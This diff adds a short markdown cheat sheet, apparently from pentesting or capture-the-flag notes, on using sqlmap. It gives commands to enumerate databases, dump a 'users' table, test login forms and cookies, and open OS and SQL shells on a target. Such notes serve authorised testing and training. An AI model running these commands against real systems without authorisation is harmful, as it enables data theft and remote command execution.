@@ -1,0 +1,22 @@
+---
+title: "SQLmap"
+---
+
+Automates SQLi detection and exploitation. Feed it a request captured from Burp for the least friction.
+
+```bash
+sqlmap -r request.txt --batch                 # from a saved raw request
+sqlmap -u "http://$IP/item?id=1" --batch --dbs
+sqlmap -u "http://$IP/item?id=1" -D shop --tables
+sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
+# Auth / cookies / POST
+sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
+sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
+# Shells
+sqlmap -r request.txt --os-shell            # OS command shell if possible
+sqlmap -r request.txt --sql-shell
+```
+
+<Tip>
+Mark the injection point with an asterisk (`id=1*`) when the parameter isn't obvious, and raise `--level`/`--risk` only if the defaults find nothing.
+</Tip>
